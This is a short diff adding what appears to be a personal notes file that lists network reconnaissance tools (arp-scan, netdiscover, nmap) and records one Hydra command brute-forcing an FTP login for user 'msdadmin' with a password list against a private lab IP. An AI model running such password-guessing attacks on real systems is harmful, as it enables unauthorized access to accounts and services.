@@ -1,0 +1,7 @@
+# This file is to remember what tools i have installed on the host machine
+# arp-scan
+# netdiscover
+# nmap
+
+# Hydra tools using in parrot VM
+hydra -l msdadmin -P pass.txt ftp://192.168.174.146
